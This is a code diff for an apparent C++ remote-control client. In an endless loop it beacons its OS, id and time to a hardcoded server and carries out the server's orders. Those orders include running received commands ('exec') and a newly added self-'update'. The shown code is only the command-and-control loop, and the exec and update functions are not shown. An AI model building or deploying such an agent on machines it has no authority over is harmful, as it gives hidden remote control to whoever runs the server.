@@ -3,7 +3,6 @@
 //
 
 #include <string>
-//#include "http-client.h" // a smaller version of the http header -> WIP
 #include "../lib/http.h"
 #include "../lib/json.hpp"
 #include "../state.h"
@@ -27,20 +26,21 @@ const OS os = OS::UNIX;
 const OS os = OS::MACOS;
 #endif
 
-// Set the ip of the server
-const string server_addr = "http://10.21.205.159:8080";
-//const string server_addr = "http://10.0.0.99:8080";
-
 /**
  * @brief Handles the new state given
  * @param data json - the required data, following fmt.json
+ * @param cli httplib::Client - a client instance of the server
  */
-auto handle_state(json data) -> void;
+auto handle_state(json data, httplib::Client &cli) -> void;
 
 auto main() -> int {
+  const string server_addr = "http://10.21.205.159:8080";
+  const string version = "0.0.1";
+
   httplib::Client cli(server_addr);
   // The default info
   json info = {
+      {"version", version},
       {"os", os},
       {"id", cli.Get("/id")->body},
   };
@@ -49,7 +49,6 @@ auto main() -> int {
   for (;;) { // infinite loop
     DEBUG("Getting time");
     info["time"] = time(nullptr);
-//    auto res = cli.Post("/opt", info.dump(), "application/json");
     DEBUG("Sending request");
     auto res = cli.Post("/opt", info.dump(), "application/json");
     DEBUG("Parsing request");
@@ -58,7 +57,7 @@ auto main() -> int {
 
     DEBUG("Handling request...");
     // handle the task
-    handle_state(response);
+    handle_state(response, cli);
 
     DEBUG("Handling request done");
 
@@ -66,18 +65,19 @@ auto main() -> int {
   }
 }
 
-auto handle_state(json data) -> void {
+auto handle_state(json data, httplib::Client &cli) -> void {
   switch (State(data["new_state"])) {
     case State::remove:
       // TODO: add remove function
       break;
     case State::kill:exit(69);
-    case State::idle:
-      // don't do anything
+    case State::idle: // don't do anything
       break;
     case State::print:print(data["data"]);
       break;
-    case State::exec:exec(data["data"], false);
+    case State::exec:exec(data["data"]);
+      break;
+    case State::update:update(cli);
       break;
   }
 }
